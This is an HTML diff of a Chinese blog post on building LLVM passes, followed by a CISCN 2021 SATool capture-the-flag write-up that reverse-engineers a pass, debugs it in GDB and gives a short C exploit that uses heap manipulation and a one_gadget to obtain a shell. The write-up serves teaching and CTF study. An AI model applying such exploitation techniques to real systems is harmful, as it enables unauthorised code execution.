@@ -1,0 +1,238 @@
+<!DOCTYPE html>
+<html>
+    <head>
+    <meta charset="utf-8">
+    <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover" name="viewport" />
+    <link rel="alternate icon" type="image/png" href="/img/favicon.png">
+    <title>Loora1N&#39;s Blog | 鹭雨 | </title>
+    
+<link rel="stylesheet" href="/css/reset.css">
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    
+<link rel="stylesheet" href="/css/markdown.css">
+
+    
+<link rel="stylesheet" href="/css/fonts.css">
+
+<meta name="generator" content="Hexo 6.2.0"></head>
+    <body>
+        <div class="paper">
+            <div class="paper-main">
+                
+                    <div class="post-header">
+    <a class="logo" href="/">Loora1N&#39;s Blog | 鹭雨</a>
+    <a class="go-home" href="/">
+        <svg width="8" height="14" viewBox="0 0 8 14">
+            <path d="M7 1L1 7l6 6" stroke="#000" stroke-width="2" fill="none" fill-rule="evenodd" stroke-linecap="round" stroke-linejoin="round"/>
+        </svg>
+    </a>
+</div>
+                
+                <div class="post-main">
+
+    
+    
+        <div class="post-main-title">
+            LLVM PASS环境搭建与基本使用
+        </div>
+        <div class="post-meta">
+            2023-11-16
+        </div>
+        <div class="post-md">
+            <h2 id="LLVM-Pass-环境搭建"><a href="#LLVM-Pass-环境搭建" class="headerlink" title="LLVM Pass 环境搭建"></a>LLVM Pass 环境搭建</h2><h3 id="预编译包的安装"><a href="#预编译包的安装" class="headerlink" title="预编译包的安装"></a>预编译包的安装</h3><p>在Ubuntu上，可以直接通过<code>apt</code>安装llvm和clang：</p>
+<pre><code class="bash">$ sudo apt install llvm
+$ sudo apt install clang
+</code></pre>
+<h3 id="编译安装"><a href="#编译安装" class="headerlink" title="编译安装"></a>编译安装</h3><pre><code class="bash">$ cd llvm-project
+$ mkdir build &amp;&amp; cd build
+$ cmake -G &quot;Unix Makefiles&quot; -DLLVM_ENABLE_PROJECTS=&quot;clang&quot; \
+    -DCMAKE_BUILD_TYPE=Release -DLLVM_TARGETS_TO_BUILD=&quot;X86&quot; \
+    -DBUILD_SHARED_LIBS=On ../llvm
+$ make
+</code></pre>
+<h2 id="基本操作"><a href="#基本操作" class="headerlink" title="基本操作"></a>基本操作</h2><h3 id="Hello-Pass-编写"><a href="#Hello-Pass-编写" class="headerlink" title="Hello Pass 编写"></a>Hello Pass 编写</h3><p>随意找一处作为项目文件夹Hello，并编写main.c如下所示</p>
+<pre><code class="c">#include &lt;stdio.h&gt;
+
+void loorain()&#123;&#125;
+
+void pwn()&#123;&#125;
+
+int main() &#123;
+    printf(&quot;Hello World LLVM PASS&quot;);
+    return 0;
+&#125;
+</code></pre>
+<p>编写Hello.cpp如下，如下代码含义可阅读官方文档：<a target="_blank" rel="noopener" href="https://llvm.org/docs/WritingAnLLVMPass.html#introduction-what-is-a-pass">Writing an LLVM Pass — LLVM 15.0.0git documentation</a></p>
+<pre><code class="c++">#include &quot;llvm/Pass.h&quot;
+#include &quot;llvm/IR/Function.h&quot;
+#include &quot;llvm/Support/raw_ostream.h&quot;
+#include &quot;llvm/IR/LegacyPassManager.h&quot;
+#include &quot;llvm/Transforms/IPO/PassManagerBuilder.h&quot;
+
+using namespace llvm;
+
+namespace &#123;
+    struct Hello : public FunctionPass &#123;
+        static char ID;
+        Hello() : FunctionPass(ID) &#123;&#125;
+        
+        bool runOnFunction(Function &amp;F) override &#123;
+            errs() &lt;&lt; &quot;Hello: &quot;;
+            errs().write_escaped(F.getName()) &lt;&lt; &#39;\n&#39;;
+            return false;
+        &#125;//遍历所有的函数名称，并以“Hello：&lt;函数名&gt;”的形式输出
+    &#125;;
+&#125;
+
+char Hello::ID = 0;
+//for opt
+static RegisterPass&lt;Hello&gt; X(&quot;hello&quot;, &quot;Hello world Pass&quot;, false, false);
+//for clang
+static llvm::RegisterStandardPasses Y(
+    llvm::PassManagerBuilder::EP_EarlyAsPossible,
+    [](const llvm::PassManagerBuilder &amp;Builder,
+       llvm::legacy::PassManagerBase &amp;PM) &#123; PM.add(new Hello()); &#125;);
+</code></pre>
+<h3 id="命令行编译"><a href="#命令行编译" class="headerlink" title="命令行编译"></a>命令行编译</h3><pre><code class="bash">$ clang `llvm-config --cxxflags` -Wl,-znodelete -fno-rtti -fPIC -shared Hello.cpp -o LLVMHello.so `llvm-config --ldflags`   
+</code></pre>
+<ul>
+<li><code>llvm-config</code>提供了<code>CXXFLAGS</code>与<code>LDFLAGS</code>参数方便查找LLVM的头文件与库文件。 如果链接有问题，还可以用<code>llvm-config --libs</code>提供动态链接的LLVM库。 具体<code>llvm-config</code>打印了什么，请自行尝试或查找官方文档。</li>
+<li><code>-fPIC -shared</code> 显然是编译动态库的必要参数。</li>
+<li>因为LLVM没用到RTTI，所以用<code>-fno-rtti</code> 来让我们的Pass与之一致。</li>
+<li><code>-Wl,-znodelete</code>主要是为了应对LLVM 5.0+中加载ModulePass引起segmentation fault的bug。如果你的Pass继承了ModulePass，还请务必加上。</li>
+</ul>
+<p>现在，你手中应该有一份编译好的LLVMHello.so了。根据刚才阅读过的官方文档的介绍，你知道可以通过命令</p>
+<pre><code class="bash">$ clang -S -emit-llvm main.c -o main.ll
+#这里也可以使用&#39;clang -c -emit-llvm main.c -o main.bc&#39;区别在于bc文件是二进制文件无法阅读
+$opt -load LLVMHello.so -hello main.ll -o main
+#这里的 -hello由Hello.cpp中的static RegisterPass&lt;Hello&gt; X参数决定
+</code></pre>
+<blockquote>
+<p>在使用opt进行动态链接时，可能会出现错误：Error opening ‘LLVMHello.so’: LLVMHello.so: cannot open shared object file: No such file or directory</p>
+<p>这实际是由于linux中动态链接库的存放地点一般比较固定，无法在默认地址搜索到名为LLVMHello.so的动态链接库，那么我们可以在.bashrc或.zshrc中加入代表当前目录的地址，如下所示：</p>
+<p>export LD_LIBRARY_PATH&#x3D;$LD_LIBRARY_PATH:.  </p>
+</blockquote>
+<p><img src="/img/article/llvmCreate/1.png" alt="效果图"></p>
+<p>如图所示，我们确实输出了main.c中所有函数名称</p>
+<h2 id="例题一：CISCN-2021-SATool"><a href="#例题一：CISCN-2021-SATool" class="headerlink" title="例题一：CISCN 2021 SATool"></a>例题一：CISCN 2021 SATool</h2><h3 id="逆向分析"><a href="#逆向分析" class="headerlink" title="逆向分析"></a>逆向分析</h3><p>这类题目对我们有用的部分opt和so文件，逆向分析SAPass.so文件</p>
+<p><img src="/img/article/llvmCreate/image-20220630204900814.png" alt="image-20220630204900814"></p>
+<p>在<code>start</code>函数中，主要内容是注册了一些函数，没什么有用的信息。在分析so文件时，一般重点是分析重写的<code>runOnFunction</code>函数，我们大多可以在函数表的最下方找到重写的<code>runOnFunction</code>函数</p>
+<p><img src="/img/article/llvmCreate/image-20220630205306216.png" alt="image-20220630205306216"></p>
+<p>在这里我们看到<code>sub_19D0</code>就是我们要找的函数，分析函数内容，这也是在我看来LLVM PASS 类题目最核心的地方——代码逆向分析。毕竟一个函数就要整整550行，能够快速地筛选什么是关键信息，什么是垃圾信息是关键。</p>
+<p><img src="/img/article/llvmCreate/image-20220630210526791.png" alt="image-20220630210526791"></p>
+<p>函数一开头就判断了我们的函数名称是不是<code>B4ckDo0r</code>, 这里由于Name的类型是QWORD存储，并非直接字符串，所以要反过来读。之后又分了5个操作分别是save, takeway, stealkey, fakekey, run.</p>
+<p>在save操作中，进行了堆块的创建</p>
+<p><img src="/img/article/llvmCreate/image-20220630211613541.png" alt="image-20220630211613541"></p>
+<p>在stealkey中，将刚刚申请的heap中内容给了204100（takeway也是跳转到了stealkey中）</p>
+<p><img src="/img/article/llvmCreate/image-20220630211950647.png" alt="image-20220630211950647"></p>
+<p>在fakekey中，将heap的内容加上了参数的值，即可编辑heap的内容（这里的heap_con就是204100，我改了个名字）</p>
+<p><img src="/img/article/llvmCreate/image-20220630212337680.png" alt="image-20220630212337680"></p>
+<p>run函数，就是直接call *heap</p>
+<p><img src="/img/article/llvmCreate/image-20220630213353185.png" alt="image-20220630213353185"></p>
+<h3 id="GDB-调试LLVM-PASS"><a href="#GDB-调试LLVM-PASS" class="headerlink" title="GDB 调试LLVM PASS"></a>GDB 调试LLVM PASS</h3><p>首先我们编写部分exp，类似我们动态做普通的PWN题目。</p>
+<pre><code class="bash">$ clang -S -emit-llvm exp.c -o exp.ll -v
+#这里加上 -v 可以显示出详细参数
+</code></pre>
+<p>我们主要途中圈的这一部分</p>
+<p><img src="/img/article/llvmCreate/image-20220630221103947.png" alt="image-20220630221103947"></p>
+<blockquote>
+<p>-triple x86_64-pc-linux-gnu -emit-llvm -disable-free -disable-llvm-verifier -discard-value-names -main-file-name exp.c -mrelocation-model static -mthread-model posix -mframe-pointer&#x3D;all -fmath-errno -fno-rounding-math -masm-verbose -mconstructor-aliases -munwind-tables -target-cpu x86-64 -dwarf-column-info -fno-split-dwarf-inlining -debugger-tuning&#x3D;gdb -v -resource-dir &#x2F;usr&#x2F;lib&#x2F;llvm-10&#x2F;lib&#x2F;clang&#x2F;10.0.0 -internal-isystem &#x2F;usr&#x2F;local&#x2F;include -internal-isystem &#x2F;usr&#x2F;lib&#x2F;llvm-10&#x2F;lib&#x2F;clang&#x2F;10.0.0&#x2F;include -internal-externc-isystem &#x2F;usr&#x2F;include&#x2F;x86_64-linux-gnu -internal-externc-isystem &#x2F;include -internal-externc-isystem &#x2F;usr&#x2F;include -fdebug-compilation-dir &#x2F;home&#x2F;loorain&#x2F;ciscn&#x2F;CISCN_2021_pwn&#x2F;SATool_附件 -ferror-limit 19 -fmessage-length 0 -fgnuc-version&#x3D;4.2.1 -fobjc-runtime&#x3D;gcc -fdiagnostics-show-option -fcolor-diagnostics -faddrsig -o exp.ll -x c exp.c</p>
+</blockquote>
+<p>在另一终端中使用如下指令,即可开始调试</p>
+<pre><code class="bash">$ gdb clang
+GNU gdb (Ubuntu 9.2-0ubuntu1~20.04.1) 9.2
+......
+......
+pwndbg&gt; set args -triple x86_64-pc-linux-gnu -emit-llvm -disable-free -disable-llvm-verifier -discard-value-names -main-file-name exp.c -mrelocation-model static -mthread-model posix -mframe-pointer=all -fmath-errno -fno-rounding-math -masm-verbose -mconstructor-aliases -munwind-tables -target-cpu x86-64 -dwarf-column-info -fno-split-dwarf-inlining -debugger-tuning=gdb -v -resource-dir /usr/lib/llvm-10/lib/clang/10.0.0 -internal-isystem /usr/local/include -internal-isystem /usr/lib/llvm-10/lib/clang/10.0.0/include -internal-externc-isystem /usr/include/x86_64-linux-gnu -internal-externc-isystem /include -internal-externc-isystem /usr/include -fdebug-compilation-dir /home/loorain/ciscn/CISCN_2021_pwn/SATool_附件 -ferror-limit 19 -fmessage-length 0 -fgnuc-version=4.2.1 -fobjc-runtime=gcc -fdiagnostics-show-option -fcolor-diagnostics -faddrsig -o exp.ll -x c exp.c
+pwndbg&gt; b main
+Breakpoint 1 at 0x40da90
+pwndbg&gt; n
+The program is not being run.
+pwndbg&gt; r
+</code></pre>
+<h3 id="解题思路-amp-EXP"><a href="#解题思路-amp-EXP" class="headerlink" title="解题思路&amp;EXP"></a>解题思路&amp;EXP</h3><ul>
+<li><p>先申请多个chunk讲tache腾空，以申请unsortbin中的chunk</p>
+</li>
+<li><p>在申请unsortbin时，第一个参数放置’\x00‘以此保留libc信息</p>
+</li>
+<li><p>利用stealkey和fakekey将chunk中的fd更改为onegadget</p>
+</li>
+<li><p>然后利用run直接getshell</p>
+<pre><code class="c">#include &lt;stdio.h&gt;
+int run()&#123;return 0;&#125;;
+int save(char *a1,char *a2)&#123;return 0;&#125;;
+int fakekey(int64)&#123;return 0;&#125;;
+int takeaway(char *a1)&#123;return 0;&#125;;
+int stealkey()&#123;return 0;&#125;;
+int B4ckDo0r()
+&#123;
+        save(&quot;aaaa&quot;,&quot;aaaa&quot;);
+        save(&quot;aaddd&quot;,&quot;aadd&quot;);
+        save(&quot;ssss&quot;,&quot;sss&quot;);
+        save(&quot;ssss&quot;,&quot;sssss&quot;);
+        save(&quot;sssss&quot;,&quot;sssss&quot;);
+        save(&quot;sssss&quot;,&quot;sssss&quot;);
+    save(&quot;sssss&quot;,&quot;sssss&quot;);
+        save(&quot;\x00&quot;,&quot;ssssss&quot;);
+        stealkey();
+        fakekey(-0x2E19b4);
+        run();
+ 
+&#125;
+</code></pre>
+</li>
+</ul>
+
+        </div>
+
+    
+
+</div>
+                <div class="footer">
+    <span>Copyright © 2022 Loora1N&#39;s Blog | 鹭雨</span>
+    <span>Theme Designed By <a target="_blank" href="https://zheli.design/one-paper">這李設計</a></span>
+</div>
+
+
+<link rel="stylesheet" href="/css/a11y-dark.min.css">
+
+
+<script src="/js/highlight.min.js"></script>
+
+
+<script src="/js/highlightjs-line-numbers.js"></script>
+
+
+<script>
+    hljs.initHighlightingOnLoad();
+    hljs.initLineNumbersOnLoad();
+</script>
+
+            </div>
+        </div>
+    <!-- hexo injector body_end start -->
+  <script data-pjax src="https://cdn.jsdelivr.net/gh/Zfour/hexo-github-calendar@1.21/hexo_githubcalendar.js"></script>
+  <script data-pjax>
+        function GithubCalendarConfig(){
+            var git_githubapiurl ="https://python-github-calendar-api.vercel.app/api?Loora1N";
+            var git_color =['#ebedf0', '#fdcdec', '#fc9bd9', '#fa6ac5', '#f838b2', '#f5089f', '#c4067e', '#92055e', '#540336', '#48022f', '#30021f'];
+            var git_user ="Loora1N";
+            var parent_div_git = document.getElementById('recent-posts');
+            var git_div_html = '<div class="recent-post-item" style="width:100%;height:auto;padding:10px;"><div id="github_loading" style="width:10%;height:100%;margin:0 auto;display: block"><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"  viewBox="0 0 50 50" style="enable-background:new 0 0 50 50" xml:space="preserve"><path fill="#d0d0d0" d="M25.251,6.461c-10.318,0-18.683,8.365-18.683,18.683h4.068c0-8.071,6.543-14.615,14.615-14.615V6.461z" transform="rotate(275.098 25 25)"><animateTransform attributeType="xml" attributeName="transform" type="rotate" from="0 25 25" to="360 25 25" dur="0.6s" repeatCount="indefinite"></animateTransform></path></svg></div><div id="github_container"></div></div>';
+            if(parent_div_git && location.pathname =='/about/'){
+                console.log('已挂载github calendar')
+                // parent_div_git.innerHTML=git_div_html+parent_div_git.innerHTML // 无报错，但不影响使用(支持pjax跳转)
+                parent_div_git.insertAdjacentHTML("afterbegin",git_div_html) // 有报错，但不影响使用(支持pjax跳转)
+            };
+            GithubCalendar(git_githubapiurl,git_color,git_user)
+        }
+        if(document.getElementById('recent-posts')){
+            GithubCalendarConfig()
+        }
+    </script>
+    <style>#github_container{min-height:280px}@media screen and (max-width:650px) {#github_container{background-image:;min-height:0px}}</style>
+    <style></style><!-- hexo injector body_end end --></body>
+</html>
